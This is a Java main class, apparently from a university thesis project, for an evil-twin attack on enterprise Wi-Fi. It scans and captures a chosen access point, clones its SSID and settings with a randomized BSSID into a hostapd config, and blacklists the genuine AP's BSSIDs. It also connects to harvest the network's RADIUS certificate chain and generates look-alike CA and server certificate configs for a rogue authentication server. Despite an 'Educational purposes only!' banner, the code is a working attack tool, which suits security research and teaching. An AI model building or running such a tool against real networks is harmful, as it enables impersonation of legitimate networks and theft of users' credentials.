package it.unical.thesis.main;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import it.unical.thesis.data.AccessPoint;
import it.unical.thesis.data.CertificateInfo;
import it.unical.thesis.generator.HostapdConfGenerator;
import it.unical.thesis.generator.OpenSSLConfigGenerator;
import it.unical.thesis.generator.OpenSSLConfigGenerator.PolicyType;
import it.unical.thesis.generator.WpaConfGenerator;
import it.unical.thesis.parser.IwParser;
import it.unical.thesis.parser.SSLCertificateParser;
import it.unical.thesis.parser.TsharkParser;
import it.unical.thesis.process.Ip;
import it.unical.thesis.process.Iw;
import it.unical.thesis.process.Systemctl;
import it.unical.thesis.process.Bootstrap;
import it.unical.thesis.process.Tshark;
import it.unical.thesis.process.WpaSupplicant;
import it.unical.thesis.utils.CertificateChainAnalyzer;
import it.unical.thesis.utils.DateConverter;
import it.unical.thesis.utils.FileUtils;
import it.unical.thesis.utils.MacAddressChanger;
import it.unical.thesis.utils.OptionChooser;
import it.unical.thesis.utils.SerialConverter;

public class Main {

	private static final String TMP_PATH = "./tmp";

	private static final String TEMPLATES_PATH = "./templates";
	
	private static final String CAPTURE_FULL_PATH = "./tmp/capture-01.cap";

	private static final String FREERADIUS_CERTS_PATH = "/usr/local/etc/raddb/certs";

	private static final String WPA_SUPPLICANT_CONF_PATH = "./tmp/wpa_supplicant.conf";

	private static final String WIFI_DRIVER_BACKEND = "nl80211";
	
	private static final String CA_CNF_FILE_NAME = "ca.cnf";
	
	private static final String SERVER_CNF_FILE_NAME = "server.cnf";
	
	private static final String BLACKLIST_PATH = "./tmp/blacklist.txt";	
	
    private static final Pattern pattern = Pattern.compile("linux", Pattern.CASE_INSENSITIVE);
	
    

	private static void generateNewCertificates(String certsPath, List<CertificateInfo> certificatesList)
	{
		CertificateInfo caInfo = CertificateChainAnalyzer.getRootCACertificate(certificatesList);
		CertificateInfo serverInfo = CertificateChainAnalyzer.getServerCertificate(certificatesList);

		OpenSSLConfigGenerator generator = new OpenSSLConfigGenerator();

		try {			
			/*File freeradiusCertsDir = new File(FREERADIUS_CERTS_PATH);
			if(freeradiusCertsDir.exists()) {
			generator.generateConfigurations(caInfo, serverInfo, 
					TEMPLATES_PATH+"/"+CA_CNF_FILE_NAME, TEMPLATES_PATH+"/"+SERVER_CNF_FILE_NAME,
					FREERADIUS_CERTS_PATH+"/"+CA_CNF_FILE_NAME, FREERADIUS_CERTS_PATH+"/"+SERVER_CNF_FILE_NAME, PolicyType.FLEXIBLE, PolicyType.FLEXIBLE);

			Bootstrap bootstrap = new Bootstrap(FREERADIUS_CERTS_PATH);
			bootstrap.startGeneration(
					SerialConverter.convertSerialToOpenSSLFormat(caInfo.getSerialNumber()), 
					DateConverter.convertToOpenSSLFormat(caInfo.getNotBefore()), 
					DateConverter.convertToOpenSSLFormat(caInfo.getNotAfter()), 
					SerialConverter.convertSerialToOpenSSLFormat(serverInfo.getSerialNumber()), 
					DateConverter.convertToOpenSSLFormat(serverInfo.getNotBefore()), 
					DateConverter.convertToOpenSSLFormat(serverInfo.getNotAfter()));
			}*/
			//else
			//{
				generator.generateConfigurations(caInfo, serverInfo, 
						TEMPLATES_PATH+"/"+CA_CNF_FILE_NAME, TEMPLATES_PATH+"/"+SERVER_CNF_FILE_NAME,
						TMP_PATH+"/"+CA_CNF_FILE_NAME, TMP_PATH+"/"+SERVER_CNF_FILE_NAME, PolicyType.FLEXIBLE, PolicyType.FLEXIBLE);
			//}

		} catch (IOException e) {
			System.err.println("Errore durante la scrittura del file .cnf: " + e.getMessage());
			e.printStackTrace();
		}
	}


	private static List<CertificateInfo> retrieveRadiusCertificates(String ssid, Integer pmf, String interfaceName)
	{
		WpaConfGenerator wpaGenerator = new WpaConfGenerator(ssid, pmf, "username_test", "password_test");
		if(wpaGenerator.writeToFile(WPA_SUPPLICANT_CONF_PATH))
		{
			WpaSupplicant wpaSupplicant = new WpaSupplicant(true);
			List<String> outputLines = wpaSupplicant.connect(interfaceName, WPA_SUPPLICANT_CONF_PATH, WIFI_DRIVER_BACKEND);
			
			if(wpaSupplicant.isUsePatch())
				wpaSupplicant.moveCertsChainTo(TMP_PATH);
			
			List<CertificateInfo> certificatesList = SSLCertificateParser.parseMultipleCertificates(outputLines);
			for(CertificateInfo certificate: certificatesList)
			{
				System.out.println(certificate);

			}
			System.out.println("Extracted certificates (duplicates): "+certificatesList.size());
			List<CertificateInfo> certificatesListDuplicatesLess = CertificateChainAnalyzer.removeDuplicates(certificatesList);
			System.out.println("Extracted certificates (without duplicates): "+certificatesListDuplicatesLess.size());
			return certificatesListDuplicatesLess;
		}
		return null;
	}


	private static AccessPoint analyzeNetworkGenerateBlacklistAndGetAccessPointData(String chosenWirelessInterface, OptionChooser optionChooser, Iw iw, Ip ip)
	{
		Map<String,AccessPoint> accessPointsMapIw = IwParser.parseIwScanOutput(iw.startScan(chosenWirelessInterface));
		List<AccessPoint> accessPointsList = new ArrayList<>(accessPointsMapIw.values());		
		System.out.println("Available access points");
		for(int i=0;i<accessPointsList.size();i++)
		{
			System.out.println(i+1+" for "+accessPointsList.get(i).getSsid()+", "+accessPointsList.get(i).getBssid());
		}
		System.out.println("Choose an access point:");
		int chosenIndex = optionChooser.choose(accessPointsList.size())-1;
		AccessPoint iwAP = accessPointsList.get(chosenIndex);
		//System.out.println(iwAP);
		
		String blacklist = generateBlackList(accessPointsList, iwAP);
		FileUtils.writeToFile(BLACKLIST_PATH, blacklist);

		/*Airmon airmon = new Airmon();
		airmon.checkKill();
		List<String> output = airmon.startMonitorMode(chosenWirelessInterface);
		String monitorInterface = AirmonParser.parseNewMonitorInterface(output);
		String usingInterface;
		if(monitorInterface!=null)
			usingInterface=monitorInterface;
		else
			usingInterface=chosenWirelessInterface;
		System.out.println("Using interface: "+usingInterface);*/	   

		changeToMonnitorMode(chosenWirelessInterface, ip, iw);
		//Airodump airodump = new Airodump();
		//airodump.startScan(usingInterface,CAPTURE_INCOMPLETE_FILE_PATH,"pcap", iwAP.getBssid(),String.valueOf(iwAP.getChannel()));
		iw.setChannel(chosenWirelessInterface, String.valueOf(iwAP.getChannel()));
		//TODO I should check if tshark is installed
		Tshark tshark = new Tshark();
		tshark.startScan(chosenWirelessInterface, CAPTURE_FULL_PATH, iwAP.getBssid());
		List<String> outputTshark = tshark.analyzeWithFilters(CAPTURE_FULL_PATH);
		AccessPoint tsharkAP = TsharkParser.parseFromTsharkOutput(outputTshark);
		System.out.println(tsharkAP);

		//deleteFile(CAPTURE_FULL_FILE_PATH);
		//airmon.stopMonitorMode(usingInterface);
		changeToManagedMode(chosenWirelessInterface, ip, iw);

		return tsharkAP;
	}


	private static void cleanUpCerts(String certsPath)
	{
		System.out.println("Cleanup of certs folder...");

		File dir = new File(certsPath);
		File[] files = dir.listFiles();
		for(File f: files)
		{
			if(f.getName().endsWith(".pem") ||
					f.getName().endsWith(".der") ||
					f.getName().endsWith(".csr") ||
					f.getName().endsWith(".crt") ||
					f.getName().endsWith(".key") ||
					f.getName().endsWith(".p12") ||
					f.getName().startsWith("serial") ||
					f.getName().startsWith("index.txt"))
				f.delete();
		}		
	}


	private static String chooseWirelessInterface(OptionChooser optionChooser, Iw iw)
	{
		//Airmon airmon = new Airmon();
		//airmon.checkKill();
		//List<String> output = airmon.listWirelessInterfaces();
		List<String> output = iw.listWirelessInterfaces();
		List<String> wirelessInterfaces = IwParser.parseInterfaceNames(output);
		System.out.println("Available wireless interfaces");
		for(int i=0;i<wirelessInterfaces.size();i++)
		{
			System.out.println(i+1+" for "+wirelessInterfaces.get(i));
		}
		System.out.println("Choose a wireless interface:");
		String chosenWirelessInterface = wirelessInterfaces.get(optionChooser.choose(wirelessInterfaces.size())-1);
		System.out.println("Chosen wireless interface: "+chosenWirelessInterface);
		return chosenWirelessInterface;
	}
	
	
	private static String generateBlackList(List<AccessPoint> accessPointsList, AccessPoint chosenAP)
	{
		StringBuilder stringBuilder = new StringBuilder();		
		for(int i=0;i<accessPointsList.size();i++)
		{
			if(accessPointsList.get(i).getSsid().equals(chosenAP.getSsid()) /*&& i!=chosenIndex*/)
				stringBuilder.append(accessPointsList.get(i).getBssid()).append("\n");
		}
		return stringBuilder.toString();
	}
	
	
	private static void changeToMonnitorMode(String interfaceName, Ip ip, Iw iw)
	{
		ip.down(interfaceName);
		iw.setType(interfaceName, "monitor");
		ip.up(interfaceName);
	}
	
	private static void changeToManagedMode(String interfaceName, Ip ip, Iw iw)
	{
		ip.down(interfaceName);
		iw.setType(interfaceName, "managed");
		ip.up(interfaceName);
	}



	public static void main(String[] args) {
		System.out.println("Educational purposes only!");
        if(!pattern.matcher(System.getProperty("os.name")).find())
        {
        	System.out.println("This software currently works only on linux.");
        	return;
        }
        
		Systemctl systemctl = new Systemctl();
		systemctl.stop("NetworkManager");
		systemctl.stop("wpa_supplicant");
		
		Iw iw = new Iw();
		OptionChooser optionChooser = new OptionChooser();		
		String chosenWirelessInterface = chooseWirelessInterface(optionChooser, iw);
		Ip ip = new Ip();
		ip.down(chosenWirelessInterface);
		ip.up(chosenWirelessInterface);
		AccessPoint accessPoint = analyzeNetworkGenerateBlacklistAndGetAccessPointData(chosenWirelessInterface, optionChooser, iw, ip);
		optionChooser.closeScanner();
    	accessPoint.setBssid(MacAddressChanger.randomizeLastByte(accessPoint.getBssid()));
		HostapdConfGenerator hostapdConfGenerator = new HostapdConfGenerator(chosenWirelessInterface, WIFI_DRIVER_BACKEND, accessPoint);
		hostapdConfGenerator.writeToFile(TMP_PATH);
		
		if(accessPoint.supportsIeee8021x()) {
			List<CertificateInfo> certificatesList = retrieveRadiusCertificates(accessPoint.getSsid(),accessPoint.getIeee80211w(),chosenWirelessInterface);
			if(certificatesList!=null) {
				cleanUpCerts(FREERADIUS_CERTS_PATH);
				generateNewCertificates(FREERADIUS_CERTS_PATH, certificatesList);
			}
		}
		
		systemctl.restart("wpa_supplicant");
		systemctl.restart("NetworkManager");
	}


}
